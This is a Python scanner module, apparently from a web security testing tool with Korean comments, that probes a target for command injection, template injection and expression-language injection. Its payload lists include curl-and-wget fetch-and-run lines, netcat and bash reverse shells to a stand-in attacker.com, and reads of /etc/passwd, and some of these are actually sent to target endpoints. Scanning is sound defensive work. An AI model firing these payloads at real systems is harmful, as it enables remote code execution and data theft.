"""
Command Injection (명령어 삽입)
OS 명령어 실행, 코드 삽입, SSTI
"""
import requests
import time

def scan(target_url):
    result = {
        'name': 'Command Injection (명령어 삽입)',
        'category': 'Code Execution',
        'status': 'SAFE',
        'severity': 'CRITICAL',
        'vulnerabilities': [],
        'recommendation': '사용자 입력으로 시스템 명령 실행 금지, 화이트리스트, 안전한 API 사용',
        'details': ''
    }
    
    details = []
    
    # 명령어 삽입 페이로드
    cmd_payloads = {
        'unix': [
            ("; ls", "Semicolon ls"),
            ("& whoami", "Ampersand whoami"),
            ("|| cat /etc/passwd", "OR cat"),
            ("`whoami`", "Backtick"),
            ("$(whoami)", "Command Substitution"),
            ("; sleep 5", "Sleep"),
            ("| nc attacker.com 4444", "Netcat"),
            ("; curl http://attacker.com/shell.sh | sh", "Curl Shell"),
            ("; wget http://attacker.com/backdoor -O /tmp/backdoor", "Wget"),
            ("& ping -c 5 127.0.0.1", "Ping"),
        ],
        'windows': [
            ("& dir", "Windows dir"),
            ("| type C:\\windows\\win.ini", "Windows type"),
            ("& timeout /t 5", "Windows timeout"),
            ("& net user", "Net user"),
            ("| findstr /si password *.txt", "Findstr"),
        ],
        'advanced': [
            ("; python -c 'import socket...'", "Python Reverse Shell"),
            ("; bash -i >& /dev/tcp/attacker.com/4444 0>&1", "Bash Reverse Shell"),
            ("; perl -e 'use Socket...'", "Perl Reverse Shell"),
        ]
    }
    
    # 1. 파일 검색/처리 기능
    details.append("[명령삽입-1] 파일 처리 명령어 삽입")
    
    search_endpoints = [
        f"{target_url}/api/files/search",
        f"{target_url}/api/files/process",
        f"{target_url}/api/convert",
        f"{target_url}/api/backup",
    ]
    
    param_names = ['filename', 'query', 'path', 'file', 'name']
    
    for endpoint in search_endpoints:
        for payload, payload_name in cmd_payloads['unix']:
            for param_name in param_names:
                try:
                    params = {param_name: f"test{payload}"}
                    headers = {'X-Security-Mode': 'vulnerable'}
                    
                    start_time = time.time()
                    resp = requests.get(endpoint, params=params, headers=headers, timeout=10)
                    elapsed = time.time() - start_time
                    
                    # Time-based 탐지
                    if 'sleep' in payload.lower() or 'ping' in payload.lower():
                        if elapsed > 4:
                            result['vulnerabilities'].append(f"Time-based Command Injection: {endpoint}")
                            details.append(f"  ✗ {payload_name} - {elapsed:.1f}초 지연")
                            result['status'] = 'VULNERABLE'
                            break
                    
                    # 명령어 실행 결과 확인
                    cmd_indicators = [
                        'root:', 'daemon:', 'bin/bash',  # /etc/passwd
                        'drwx', 'total ',  # ls -la
                        '[fonts]', '[extensions]',  # win.ini
                        'volume', 'directory',  # dir
                    ]
                    
                    if any(indicator in resp.text.lower() for indicator in cmd_indicators):
                        result['vulnerabilities'].append(f"Command Injection: {endpoint} - {payload_name}")
                        details.append(f"  ✗ {payload_name} - 명령어 실행됨")
                        result['status'] = 'VULNERABLE'
                        break
                        
                except requests.Timeout:
                    if 'sleep' in payload.lower() or 'ping' in payload.lower():
                        result['vulnerabilities'].append(f"Command Injection: {payload_name}")
                        details.append(f"  ✗ {payload_name} - Timeout")
                        result['status'] = 'VULNERABLE'
                        break
                except:
                    pass
                    
                if result['status'] == 'VULNERABLE':
                    break
                    
            if result['status'] == 'VULNERABLE':
                break
                
        if result['status'] == 'VULNERABLE':
            break
    
    # 2. 이미지/파일 변환 기능
    details.append("\n[명령삽입-2] 파일 변환 명령어 삽입")
    
    try:
        convert_url = f"{target_url}/api/convert"
        
        convert_payloads = [
            "test.jpg; cat /etc/passwd;",
            "test.jpg | whoami",
            "test.jpg`id`",
        ]
        
        for payload in convert_payloads:
            data = {
                'input': payload,
                'output': 'output.jpg',
                'format': 'jpg'
            }
            
            headers = {
                'X-Security-Mode': 'vulnerable',
                'Content-Type': 'application/json'
            }
            
            resp = requests.post(convert_url, json=data, headers=headers, timeout=5)
            
            if 'root:' in resp.text or 'uid=' in resp.text:
                result['vulnerabilities'].append("파일 변환 Command Injection")
                details.append(f"  ✗ 파일 변환 시 명령어 실행")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • 파일 변환 기능 없음")
    
    # 3. 네트워크 진단 기능 (ping, nslookup)
    details.append("\n[명령삽입-3] 네트워크 진단 명령어 삽입")
    
    try:
        ping_url = f"{target_url}/api/ping"
        
        ping_payloads = [
            "127.0.0.1; cat /etc/passwd",
            "127.0.0.1 & whoami",
            "127.0.0.1 | ls -la",
            "127.0.0.1; sleep 5",
        ]
        
        for payload in ping_payloads:
            params = {'host': payload, 'ip': payload}
            headers = {'X-Security-Mode': 'vulnerable'}
            
            start_time = time.time()
            
            try:
                resp = requests.get(ping_url, params=params, headers=headers, timeout=6)
                elapsed = time.time() - start_time
                
                cmd_outputs = ['root:', 'total ', 'drwx', 'uid=', 'gid=']
                
                if any(output in resp.text for output in cmd_outputs):
                    result['vulnerabilities'].append("네트워크 진단 Command Injection")
                    details.append(f"  ✗ ping 명령어 삽입 성공")
                    result['status'] = 'VULNERABLE'
                    break
                elif 'sleep' in payload and elapsed > 4:
                    result['vulnerabilities'].append("Time-based Command Injection (ping)")
                    details.append(f"  ✗ Time-based - {elapsed:.1f}초")
                    result['status'] = 'VULNERABLE'
                    break
                    
            except requests.Timeout:
                if 'sleep' in payload:
                    result['vulnerabilities'].append("Command Injection (ping timeout)")
                    details.append(f"  ✗ Timeout 발생")
                    result['status'] = 'VULNERABLE'
                    break
                    
    except:
        details.append("  • 네트워크 진단 기능 없음")
    
    # 4. 로그 파일 조회
    details.append("\n[명령삽입-4] 로그 조회 명령어 삽입")
    
    try:
        log_url = f"{target_url}/api/logs"
        
        log_payloads = [
            "access.log; cat /etc/passwd",
            "error.log | whoami",
            "app.log`id`",
        ]
        
        for payload in log_payloads:
            params = {'file': payload, 'log': payload}
            headers = {'X-Security-Mode': 'vulnerable'}
            
            resp = requests.get(log_url, params=params, headers=headers, timeout=5)
            
            if 'root:' in resp.text or 'uid=' in resp.text:
                result['vulnerabilities'].append("로그 조회 Command Injection")
                details.append(f"  ✗ 로그 조회 시 명령어 실행")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • 로그 조회 기능 없음")
    
    # 5. Server-Side Template Injection (SSTI)
    details.append("\n[명령삽입-5] SSTI (Template Injection)")
    
    try:
        ssti_payloads = [
            # Jinja2
            ("{{7*7}}", "Jinja2 Calc", "49"),
            ("{{config}}", "Jinja2 Config", "SECRET"),
            ("{{''.__class__.__mro__[1].__subclasses__()}}", "Jinja2 Class", "class"),
            
            # Twig
            ("{{7*'7'}}", "Twig Calc", "7777777"),
            
            # FreeMarker
            ("${7*7}", "FreeMarker", "49"),
            
            # Velocity
            ("#set($x=7*7)$x", "Velocity", "49"),
            
            # Smarty
            ("{7*7}", "Smarty", "49"),
            
            # Thymeleaf
            ("${7*7}", "Thymeleaf", "49"),
        ]
        
        for payload, engine, expected in ssti_payloads:
            params = {'name': payload, 'template': payload, 'message': payload}
            
            resp = requests.get(target_url, params=params, timeout=5)
            
            if expected in resp.text:
                result['vulnerabilities'].append(f"SSTI: {engine}")
                details.append(f"  ✗ {engine} - {payload} → {expected}")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • SSTI 테스트 실패")
    
    # 6. Expression Language Injection
    details.append("\n[명령삽입-6] Expression Language Injection")
    
    try:
        el_payloads = [
            "${7*7}",
            "#{7*7}",
            "${applicationScope}",
            "#{systemProperties}",
        ]
        
        for payload in el_payloads:
            params = {'expr': payload, 'value': payload}
            
            resp = requests.get(target_url, params=params, timeout=5)
            
            if '49' in resp.text or 'java.util' in resp.text:
                result['vulnerabilities'].append("Expression Language Injection")
                details.append(f"  ✗ EL Injection: {payload}")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • EL Injection 테스트 실패")
    
    # 7. Blind Command Injection
    details.append("\n[명령삽입-7] Blind Command Injection")
    
    try:
        # DNS Exfiltration (실제로는 공격자 서버 필요)
        blind_payloads = [
            "; nslookup attacker.com",
            "& curl http://attacker.com/$(whoami)",
        ]
        
        details.append("  • Blind Command Injection은 Out-of-band 테스트 필요")
        
    except:
        pass
    
    if result['status'] == 'SAFE':
        details.append("\n✓ Command Injection 방어가 잘 되어 있습니다")
    
    result['details'] = '\n'.join(details)
    return result